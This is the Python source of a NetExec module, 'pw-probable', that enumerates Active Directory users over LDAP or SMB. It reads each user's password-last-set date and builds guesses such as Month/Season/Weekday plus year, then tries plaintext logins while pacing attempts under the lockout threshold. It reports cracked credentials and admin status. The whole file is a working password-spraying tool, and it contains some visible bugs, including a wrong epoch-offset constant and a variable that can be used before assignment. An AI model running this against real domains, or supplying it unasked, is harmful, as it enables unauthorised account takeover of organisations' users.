import re
from datetime import datetime, timedelta

from impacket.ldap import ldapasn1 as ldapasn1_impacket
from impacket.ldap import ldap as ldap_impacket
from impacket.dcerpc.v5 import transport, samr
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.rpcrt import DCERPC_v5
from impacket.nt_errors import STATUS_MORE_ENTRIES

from nxc.logger import nxc_logger
from nxc.protocols.smb.passpol import PassPolDump
from nxc.protocols.smb.samruser import UserSamrDump

class Utilities(object):
    """Class containing common utilities"""

    @staticmethod
    def convert_to_datetime(old_large_integer):
        """Function to convert Windows Timestamp into DateTime."""
        timestamp = (old_large_integer["HighPart"] << 32) | old_large_integer["LowPart"]

        # The timestamp is in 100-nanosecond intervals, so convert to seconds
        timestamp /= 10**7

        # Adjust for the difference between the Windows epoch (1601-01-01) and the Unix epoch (1970-01-01)
        timestamp -= 11644387200

        # Convert to a datetime object
        return datetime.fromtimestamp(timestamp)


class UserSamrDumpWithDate(UserSamrDump):
    def fetchList(self, rpctransport):
        dce = DCERPC_v5(rpctransport)
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        # Setup Connection
        resp = samr.hSamrConnect2(dce)
        if resp["ErrorCode"] != 0:
            raise Exception("Connect error")

        resp2 = samr.hSamrEnumerateDomainsInSamServer(
            dce,
            serverHandle=resp["ServerHandle"],
            enumerationContext=0,
            preferedMaximumLength=500,
        )
        if resp2["ErrorCode"] != 0:
            raise Exception("Connect error")

        resp3 = samr.hSamrLookupDomainInSamServer(
            dce,
            serverHandle=resp["ServerHandle"],
            name=resp2["Buffer"]["Buffer"][0]["Name"],
        )
        if resp3["ErrorCode"] != 0:
            raise Exception("Connect error")

        resp4 = samr.hSamrOpenDomain(
            dce,
            serverHandle=resp["ServerHandle"],
            desiredAccess=samr.MAXIMUM_ALLOWED,
            domainId=resp3["DomainId"],
        )
        if resp4["ErrorCode"] != 0:
            raise Exception("Connect error")

        self.__domains = resp2["Buffer"]["Buffer"]
        domainHandle = resp4["DomainHandle"]
        # End Setup

        status = STATUS_MORE_ENTRIES
        enumerationContext = 0
        while status == STATUS_MORE_ENTRIES:
            try:
                resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)
            except DCERPCException as e:
                if str(e).find("STATUS_MORE_ENTRIES") < 0:
                    self.logger.fail("Error enumerating domain user(s)")
                    break
                resp = e.get_packet()
            self.logger.success("Enumerated domain user(s)")
            for user in resp["Buffer"]["Buffer"]:
                r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user["RelativeId"])
                pwdLastSet = Utilities.convert_to_datetime(samr.hSamrQueryInformationUser2(dce, r["UserHandle"], samr.USER_INFORMATION_CLASS.UserAllInformation)["Buffer"]["All"]["PasswordLastSet"])
                userAccountControl = False
                badPwdCount = int(samr.hSamrQueryInformationUser2(dce, r["UserHandle"], samr.USER_INFORMATION_CLASS.UserAllInformation)["Buffer"]["All"]["BadPasswordCount"])

                info_user = samr.hSamrQueryInformationUser2(dce, r["UserHandle"], samr.USER_INFORMATION_CLASS.UserAllInformation)["Buffer"]["All"]["AdminComment"]
                self.logger.highlight(f"{self.domain}\\{user['Name']:<30} {info_user}")
                self.users.append(UserAccount(user["Name"], pwdLastSet, userAccountControl, badPwdCount))
                samr.hSamrCloseHandle(dce, r["UserHandle"])

            enumerationContext = resp["EnumerationContext"]
            status = resp["ErrorCode"]

        dce.disconnect()

class UserAccount(object):
    def __init__(self, sAMAccountName, pwdLastSet, userAccountControl, badPwdCount):
        self.sAMAccountName = sAMAccountName
        self.pwdLastSet = pwdLastSet
        self.userAccountControl = userAccountControl
        self.badPwdCount = badPwdCount

class NXCModule:
    """
    Attempt most probable passwords by observing the password's last update date and forming a password from these values
    Module by @edonsec

    Gather policy - understand if Complex is enabled (point in time, old passwords may still be vulnerable)

    Loops through users
     - Where pwdLastSet is not null, calculate passwords of the following:
     - <Month><Year Short> - i.e. December23
     - <Month><Year Long> - i.e. December2023
     - <Season><Year Short> - i.e. Winter23
     - <season><Year Long> - i.e. Winter2023
     - <Day of week><Year Short> - Thursday23
     - <Day of week><Year Long> - Thursday2023

    Considerations:
     - Lowercase all?
     - Even when complex, users may still have old style passwords
     - Observe lockout period
    """

    name = "pw-probable"
    description = "Brute force password based on password last set date strategies. Often passwords are reset using this behaviour."
    supported_protocols = ["ldap", "smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, common_names):
        self.ignore_complex = False
        self.include_common = False
        self.include_machine = False
        self.pw_selection = False
        self.outfile = False

        self.common_names = common_names if common_names else ["krbtgt", "Guest"]

    def options(self, context, module_options):
        """
        IGNORECOMPLEX   Forces use of non-complex passwords
        INCLUDECOMMON   Include common accounts krbtgt and Guest
        INCLUDEMACHINE  Include Machine accounts (Accounts ending in $)
        PWSELECTION     Provide a comma separated list of compatible values: D (Day), M (Month), S (Season). Then the complex compatible Year Long (YL - 2023), Year Short (YS - 23). Example: DYL,MYL,SYS. This sets the order of precedence too, so prioritise the passwords most likely.
        OUTFILE         Does not attempt to use the passwords and creates a file containing a tab seperated list of usernames and passwords. 
        """
        if "IGNORECOMPLEX" in module_options:
            self.ignore_complex = True
        if "INCLUDECOMMON" in module_options:
            self.include_common = True
        if "INCLUDEMACHINE" in module_options:
            self.include_machine = True
        if "PWSELECTION" in module_options:
            self.pw_selection = module_options["PWSELECTION"].split(",")
        if "OUTFILE" in module_options:
            self.outfile = module_options["OUTFILE"]

    def on_login(self, context, connection):
        """Concurrent. Required if on_admin_login is not present. This gets called on each authenticated connection"""
        # Building the search filter

        connection_type = connection.__class__.__name__
        original_user = connection.username
        valid_users = []

        pass_pol_dump = PassPolDump(connection)
        passpol = pass_pol_dump.dump()
        accounts = []
        
        if connection_type == "ldap":
            accounts = self._process_ldap(context, connection, passpol)
        elif connection_type == "smb":
            accounts = self._process_smb(context, connection, passpol)

        if accounts:
            valid_users = self._process_accounts(accounts, passpol, original_user, connection, context)

        if len(valid_users) > 0:
            context.log.success("Found following users: ")
            for valid_user in valid_users:
                context.log.highlight(f"User: {valid_user[0]}; Password: {valid_user[1]}; Admin: {valid_user[2]}")
        
        if self.outfile:
            context.log.highlight(f"A file \"{self.outfile}\" has been written containing the users and probable passwords.")

    def is_complex_password_policy(self, passpol):
        """Function to return if complex password flag is enabled"""
        bitmask = passpol["pass_prop"]

        return bool(int(bitmask) & 1)

    def is_disabled_account(self, userAccountControl):
        """Function to return if account is disabled."""
        return userAccountControl & 2
    
    def is_machine_account(self, user):
        """Function to return if account is a machine account (ends in $)"""
        return user[-1] == "$"

    def is_common_account(self, user):
        """Function to return if user is a common account"""
        return user in self.common_names

    def ad_timestamp(self, timestamp):
        """Function to convert ad time stamp to unix compatible timestamp."""
        if timestamp != 0:
            return datetime(1601, 1, 1) + timedelta(seconds=timestamp/10000000)

        return False

    def generate_password_set(self, dt, complex = False, pw_selection = False):
        """Function to generate a list of probable passwords based on date"""
        if not dt:
            return None
       
        season = self.get_season(dt)

        password_attempts = {
            "MYS": dt.strftime("%B%y"), # <Month><Year Short>
            "MYL": dt.strftime("%B%Y"), # <Month><Year Long>
            "SYS": season + dt.strftime("%y"), # <Season><Year Short>
            "SYL": season + dt.strftime("%Y"), # <Season><Year Long>
            "DYS": dt.strftime("%A%y"), # <Day of week><Year Short>
            "DYL": dt.strftime("%A%Y"), # <Day of week><Year Long>
            "M": dt.strftime("%B"), # Month
            "S": season, # Season
            "D": dt.strftime("%A"), # Day of week
        }

        complex_compliant = ["MYS", "MYL", "SYS", "SYL", "DYS", "DYL"]
        simple = ["M", "S", "D"]

        subset = []

        if pw_selection:
            subset = pw_selection
        else:
            if complex:
                subset = complex_compliant
            else:
                subset = complex_compliant + simple

        return [password_attempts[key] for key in subset if key in password_attempts]

    def get_season(self, dt):
        """Function to return season of date"""
        month = dt.month
        if month in [12, 1, 2]:
            return "Winter"
        elif month in [3, 4, 5]:
            return "Spring"
        elif month in [6, 7, 8]:
            return "Summer"
        else:
            return "Autumn"

    def _process_smb(self, context, connection, passpol):
        """Function to process the SMB connection and return users."""
        users = UserSamrDumpWithDate(connection)
    
        return users.dump()

    def _process_ldap(self, context, connection, passpol):
        """Function to process the LDAP connection and return users."""
        search_filter = "(objectclass=user)"

        try:
            context.log.debug(f"Search Filter={search_filter}")
            resp = connection.ldapConnection.search(
                searchFilter=search_filter,
                attributes=["sAMAccountName", "pwdLastSet", "userAccountControl", "badPwdCount"],
                sizeLimit=0,
            )
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                context.log.debug("sizeLimitExceeded exception caught, giving up and processing the data received")
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
            else:
                nxc_logger.debug(e)
                return False

        valid_users = []

        context.log.debug(f"Total of records returned {len(resp)}")
        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue

            sAMAccountName = ""
            pwdLastSet = ""
            userAccountControl = 0
            badPwdCount = 0

            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                    elif str(attribute["type"]) == "pwdLastSet":
                        pwdLastSet = self.ad_timestamp(int(attribute["vals"][0]))
                    elif str(attribute["type"]) == "userAccountControl":
                        userAccountControl = int(attribute["vals"][0])
                    elif str(attribute["type"]) == "badPwdCount":
                        badPwdCount = int(attribute["vals"][0])

                valid_users.append(UserAccount(sAMAccountName, pwdLastSet, userAccountControl, badPwdCount))


            except Exception as e:
                context.log.debug("Exception:", exc_info=True)
                context.log.debug(f"Skipping item, cannot process due to error {e!s}")

        return valid_users

    def _process_accounts(self, accounts, passpol, original_user, connection, context):
        valid_users = []
        for account in accounts:
            if account.sAMAccountName != "" and account.pwdLastSet != "":
                if original_user == account.sAMAccountName:
                    continue
                if self.is_machine_account(account.sAMAccountName) and not self.include_machine:
                    continue
                if self.is_common_account(account.sAMAccountName) and not self.include_common:
                    continue
                if self.is_disabled_account(account.userAccountControl):
                    context.log.debug(f"{account.sAMAccountName} is disabled.")
                    continue

                context.log.debug(f"{account.sAMAccountName} password last set {account.pwdLastSet}")

                only_complex = self.is_complex_password_policy(passpol) and not self.ignore_complex

                if passpol["accnt_lock_thres"] != "None": 
                    threshold = int(passpol["accnt_lock_thres"]) - 1
                    context.log.debug(f"Threshold for user {account.sAMAccountName} = {threshold} and bad count = {account.badPwdCount}.")

                reset_lock = passpol["rst_accnt_lock_counter"].strip()

                if threshold:
                    if account.badPwdCount >= threshold:
                        context.log.highlight(f"{account.sAMAccountName} has exceeded lockout threshold, please try again later in {reset_lock}.")
                        continue

                    if account.badPwdCount != 0:
                        threshold = threshold - account.badPwdCount

                password_set = self.generate_password_set(account.pwdLastSet, only_complex, self.pw_selection)

                if threshold > 0 and password_set and not self.outfile:
                    password_set = password_set[0:threshold]

                if password_set:

                    for pw in password_set:
                        if self.outfile:
                            with open(self.outfile, "a+", encoding="utf-8") as fp:
                                fp.write(f"{account.sAMAccountName}\t{pw}\n")
                                continue

                        connection.admin_privs = False # Reset each time
                
                        valid_user = connection.plaintext_login(connection.domain, account.sAMAccountName, pw)

                        if valid_user:
                            valid_users.append([
                                account.sAMAccountName,
                                pw,
                                connection.admin_privs
                            ])

                            break
        return valid_users
